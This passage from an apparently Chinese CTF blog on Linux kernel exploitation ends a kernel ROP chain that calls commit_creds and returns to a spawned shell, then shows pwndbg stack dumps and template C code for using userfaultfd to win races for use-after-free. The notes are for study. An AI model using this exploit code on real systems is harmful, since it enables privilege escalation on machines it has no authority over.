class="number">0xffffffff8101aa6a</span> + offset; <span class="comment">// mov rdi, rax; call rdx; </span></span><br><span class="line">    rop[i++] = commit_creds;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//the rcx is &quot;&amp;commit_creds&quot;</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret; </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = (<span class="type">size_t</span>)spawn_shell;         <span class="comment">// rip </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    write(fd,rop,<span class="number">0x800</span>);</span><br><span class="line">    core_copy_func(fd,<span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>wiki上关于ropchian的注释，有点让人容易误解。我感觉这才是这种构建ropchain的栈题最难的部分。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">00:0000│ rsp   0xffffb3eb00223e18 ◂— add    byte ptr [rcx], ch /* 0x9cf8d7478bd12900 */</span><br><span class="line">... ↓          9 skipped</span><br><span class="line">0a:0050│       0xffffb3eb00223e68 —▸ 0xffffffff8b200b2f ◂— pop    rdi</span><br><span class="line">0b:0058│       0xffffb3eb00223e70 ◂— 0</span><br><span class="line">0c:0060│       0xffffb3eb00223e78 —▸ 0xffffffff8b29cce0 ◂— push   rbp</span><br><span class="line">0d:0068│       0xffffb3eb00223e80 —▸ 0xffffffff8b2a0f49 ◂— pop    rdx</span><br><span class="line">0e:0070│       0xffffb3eb00223e88 —▸ 0xffffffff8b221e53 ◂— pop    rcx</span><br><span class="line">0f:0078│       0xffffb3eb00223e90 —▸ 0xffffffff8b21aa6a ◂— mov    rdi, rax</span><br><span class="line">10:0080│       0xffffb3eb00223e98 —▸ 0xffffffff8b29c8e0 ◂— push   r12</span><br><span class="line">11:0088│       0xffffb3eb00223ea0 —▸ 0xffffffff8bc012da ◂— swapgs</span><br><span class="line">12:0090│ rdi-4 0xffffb3eb00223ea8 ◂— 0</span><br><span class="line">13:0098│       0xffffb3eb00223eb0 —▸ 0xffffffff8c456968 —▸ 0xffffffff8c98af50 ◂— push   -0x73ba97 /* 0xffffffff8c456968 */</span><br><span class="line">14:00a0│       0xffffb3eb00223eb8 ◂— 0x6677889a</span><br><span class="line">15:00a8│       0xffffb3eb00223ec0 —▸ 0xffff9a013f460100 ◂— 0</span><br><span class="line">16:00b0│       0xffffb3eb00223ec8 ◂— add    byte ptr [rcx], al /* 0xffffffffffff0100 */</span><br><span class="line">17:00b8│       0xffffb3eb00223ed0 ◂— add    byte ptr [rcx], al /* 0xffffffffffff0100 */</span><br><span class="line">18:00c0│       0xffffb3eb00223ed8 —▸ 0xffff9a013f460100 ◂— 0</span><br><span class="line">19:00c8│       0xffffb3eb00223ee0 —▸ 0xffff9a013f460100 ◂— 0</span><br><span class="line">1a:00d0│       0xffffb3eb00223ee8 ◂— 3</span><br><span class="line">1b:00d8│       0xffffb3eb00223ef0 ◂— 0x6677889a</span><br><span class="line">1c:00e0│       0xffffb3eb00223ef8 ◂— add    byte ptr [rcx], al /* 0xffffffffffff0100 */</span><br><span class="line">1d:00e8│       0xffffb3eb00223f00 —▸ 0xffffffff8b38f28f ◂— jmp    0xffffffff8b38f258</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">00:0000│ rsp 0xffffb0d800233e70 ◂— 0</span><br><span class="line">01:0008│     0xffffb0d800233e78 —▸ 0xffffffffab09cce0 ◂— push   rbp</span><br><span class="line">02:0010│     0xffffb0d800233e80 —▸ 0xffffffffab0a0f49 ◂— pop    rdx</span><br><span class="line">03:0018│     0xffffb0d800233e88 —▸ 0xffffffffab021e53 ◂— pop    rcx</span><br><span class="line">04:0020│     0xffffb0d800233e90 —▸ 0xffffffffab01aa6a ◂— mov    rdi, rax</span><br><span class="line">05:0028│     0xffffb0d800233e98 —▸ 0xffffffffab09c8e0 ◂— push   r12</span><br><span class="line">06:0030│     0xffffb0d800233ea0 —▸ 0xffffffffaba012da ◂— swapgs </span><br><span class="line">07:0038│     0xffffb0d800233ea8 ◂— 0</span><br><span class="line">───────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0 0xffffffffab000b2f</span><br><span class="line">   f 1              0x0</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; tele 0xffffffffab01aa6a</span><br><span class="line">00:0000│  0xffffffffab01aa6a ◂— mov    rdi, rax</span><br><span class="line">01:0008│  0xffffffffab01aa72 ◂— mov    rax, qword ptr [rbx]</span><br><span class="line">02:0010│  0xffffffffab01aa7a ◂— call   0xffffffffab86be50</span><br><span class="line">03:0018│  0xffffffffab01aa82 ◂— or     byte ptr [rcx], dh</span><br><span class="line">04:0020│  0xffffffffab01aa8a ◂— pop    rbp</span><br><span class="line">05:0028│  0xffffffffab01aa92 ◂— nop    dword ptr [rax]</span><br><span class="line">06:0030│  0xffffffffab01aa9a ◂— test   byte ptr [rax], al</span><br><span class="line">07:0038│  0xffffffffab01aaa2 ◂— nop    dword ptr [rax]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">00:0000│ rsp 0xffffb9b480223e70 ◂— 0</span><br><span class="line">01:0008│     0xffffb9b480223e78 —▸ 0xffffffffade9cce0 ◂— push   rbp</span><br><span class="line">02:0010│     0xffffb9b480223e80 —▸ 0xffffffffadea0f49 ◂— pop    rdx</span><br><span class="line">03:0018│     0xffffb9b480223e88 —▸ 0xffffffffade21e53 ◂— pop    rcx</span><br><span class="line">04:0020│     0xffffb9b480223e90 —▸ 0xffffffffade1aa6a ◂— mov    rdi, rax</span><br><span class="line">05:0028│     0xffffb9b480223e98 —▸ 0xffffffffade9c8e0 ◂— push   r12</span><br><span class="line">06:0030│     0xffffb9b480223ea0 —▸ 0xffffffffae8012da ◂— swapgs </span><br><span class="line">07:0038│     0xffffb9b480223ea8 ◂— 0</span><br><span class="line">───────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0 0xffffffffade00b2f</span><br><span class="line">   f 1              0x0</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; tele 0xffffffffadea0f49</span><br><span class="line">00:0000│  0xffffffffadea0f49 ◂— pop    rdx</span><br><span class="line">01:0008│  0xffffffffadea0f51 ◂— mov    eax, dword ptr [rsi]</span><br><span class="line">02:0010│  0xffffffffadea0f59 ◂— movabs al, byte ptr [0xbe83e8b48000003]</span><br><span class="line">03:0018│  0xffffffffadea0f61 ◂— or     eax, dword ptr [rbx]</span><br><span class="line">04:0020│  0xffffffffadea0f69 ◂— add    byte ptr [rax], al</span><br><span class="line">05:0028│  0xffffffffadea0f71 ◂— push   rsi</span><br><span class="line">06:0030│  0xffffffffadea0f79 ◂— push   rbp</span><br><span class="line">07:0038│  0xffffffffadea0f81 ◂— push   rbx</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tele 0xffffffffade1aa6a</span><br><span class="line">00:0000│  0xffffffffade1aa6a ◂— mov    rdi, rax</span><br><span class="line">01:0008│  0xffffffffade1aa72 ◂— mov    rax, qword ptr [rbx]</span><br><span class="line">02:0010│  0xffffffffade1aa7a ◂— call   0xffffffffae66be50</span><br><span class="line">03:0018│  0xffffffffade1aa82 ◂— or     byte ptr [rcx], dh</span><br><span class="line">04:0020│  0xffffffffade1aa8a ◂— pop    rbp</span><br><span class="line">05:0028│  0xffffffffade1aa92 ◂— nop    dword ptr [rax]</span><br><span class="line">06:0030│  0xffffffffade1aa9a ◂— test   byte ptr [rax], al</span><br><span class="line">07:0038│  0xffffffffade1aaa2 ◂— nop    dword ptr [rax]</span><br></pre></td></tr></table></figure>

<h3 id="bypass-smep"><a href="#bypass-smep" class="headerlink" title="bypass smep"></a>bypass smep</h3><p><a target="_blank" rel="noopener" href="https://chowdera.com/2022/04/202204142053592614.html">https://chowdera.com/2022/04/202204142053592614.html</a></p>
<h3 id="userfaultfd"><a href="#userfaultfd" class="headerlink" title="userfaultfd"></a>userfaultfd</h3><p>userfaultfd并不是利用机制，而是Linux内核编程中为了更灵活留给开发者使用处理缺页异常的机制。开发者(用户)可以自定义事件来处理这种事(缺页)。<em><strong>在处理函数结束之前，缺页发生的位置(线程)将处于暂停状态，这将非常有助于条件竞争的利用</strong></em></p>
<p>当然，本意是为了提升开发的灵活性，在kernel pwn中常被用于提高条件竞争的成功率。</p>
<p><font color=red>比如</font></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if(ptr)</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">	copy_from_user(kptr, user_buf, size);</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当我们进行<code>copy_from_user(kptr, user_buf, size);</code>这个kptr指针被发现在我们的非映射区域，按理说不就直接报缺页错误吗？但是，说了提高开的灵活性，可以允许开发者自己写处理函数进行处理。在这个处理函数运行期间，该线程是一直被暂停的，知道处理函数结束。在这暂停期间，我们课另开一个线程，将<code>kptr</code>释放掉，将其他结构(比如tty_struct)申请到这里，当却也处理结束以后，<code>copy_from_suer</code>恢复执行，但此时<code>kptr</code>是指向<code>tty_struct</code>的，那就可以对<code>tty_struct</code>进行修改。</p>
<p>其效果，也就是我们常说的UAF</p>
<p>(当然，其实没有这个机制也可以，只是可能成功率会低一些，好吧，其实是低很多。)，制造条件竞争造成UAF。</p>
<p>具体</p>
<p>注册userfaultfd</p>
<p>网上大佬的模板，很多，但是好像都大差不差。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">ErrExit</span><span class="params">(<span class="type">char</span>* err_msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);<span class="comment">//exit when it is wrong</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">RegisterUserfault</span><span class="params">(<span class="type">void</span> *fault_page,<span class="type">void</span> *handler)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pthread_t</span> thr;<span class="comment">//we need a thread at first</span></span><br><span class="line">    <span class="comment">//we need two struct to do something</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span><span class="comment">//the api struct we need to store the the &#x27;api&#x27;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span><span class="comment">//the register struct we need to store some information about our register func</span></span><br><span class="line">    <span class="type">uint64_t</span> uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);<span class="comment">//return the fd about the userfault</span></span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ur.range.start = (<span class="type">unsigned</span> <span class="type">long</span>)fault_page; <span class="comment">//我们要监视的区域</span></span><br><span class="line">    ur.range.len   = PAGE_SIZE;<span class="comment">//the size of the page</span></span><br><span class="line">    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;<span class="comment">//what would it do if the page is missing</span></span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>) <span class="comment">//注册缺页错误处理</span></span><br><span class="line">        <span class="comment">//当发生缺页时，程序会阻塞，此时，我们在另一个线程里操作</span></span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">    <span class="comment">//开一个线程，接收错误的信号，然后处理</span></span><br><span class="line">    <span class="type">int</span> s = pthread_create(&amp;thr, <span class="literal">NULL</span>,handler, (<span class="type">void</span>*)uffd);<span class="comment">//link the thread(who), handler(how to do) and the uffd(with whom) </span></span><br><span class="line">    <span class="keyword">if</span> (s!=<span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们注册的时候，使用</p>
<p><code>RegisterUserfault(mmap_buf,handler);</code>，就可以将<code>handler</code>函数绑定到<code>mmap_buf</code>,当<code>mmap_buf</code>出现缺页异常时就会调用<code>handler</code>来处理。</p>
<p>关于<code>handler</code>的写法</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span>* <span class="title function_">userfaultfd_leak_handler</span><span class="params">(<span class="type">void</span>* arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span><span class="comment">//to store the wrong message</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> uffd = (<span class="type">unsigned</span> <span class="type">long</span>) arg;<span class="comment">//the arg points to the target</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    <span class="type">int</span> nready;</span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);<span class="comment">//the func always be waiting for the signal</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>定义一个<code>uffd_msg</code>类型的结构在未来接收消息。</p>
<p>定义一个<code>pollfd</code>类型的结构体提供轮询操作，其<code>fd</code>设置为传入的<code>arg</code>,<code>event</code>设置为POLLIN,然后执行<code>poll&amp;(pollfd, 1, -1);</code>来进行轮询，这个函数会一直进行轮询，知道缺页错误出现。</p>
<p>当缺页出现后处理缺页。</p>
<p>如下</p>
<p>开头的<code>sleep</code>操作就可以实现我们暂停线程的操作，然后在这个暂停期间我们<code>mmap</code>一个页(因为他不是缺页吗)</p>
<p>注意：在<code>mmap</code>时，如果自己有缺页错误，它会有自己的处理函数(托底)，所以不会无限套娃循环下去。</p>
<p>其实，在这里，我们就差不多完成我们的目的，即让线程暂停下来。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">if</span> (nready != <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] Wrong poll return val&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    nready = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">    <span class="keyword">if</span> (nready &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] msg err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* page = (<span class="type">char</span>*) mmap(<span class="literal">NULL</span>, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (page == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] mmap err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">    <span class="comment">// init page</span></span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line">    uc.src = (<span class="type">unsigned</span> <span class="type">long</span>) page;</span><br><span class="line">    uc.dst = (<span class="type">unsigned</span> <span class="type">long</span>) msg.arg.pagefault.address &amp; ~(PAGE_SIZE - <span class="number">1</span>);</span><br><span class="line">    uc.len = PAGE_SIZE;</span><br><span class="line">    uc.mode = <span class="number">0</span>;</span><br><span class="line">    uc.copy = <span class="number">0</span>;</span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] leak handler done&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ca</p>

    </div>
    
    
    
    
    
    
    
</div>

            <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2022 - 2024 Q^Q
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;desk9t
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

        </div>
        
        <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
        </transition>
        
    </div>
    <script src="/js/main.js"></script>
    
    




    
</body>
</html>
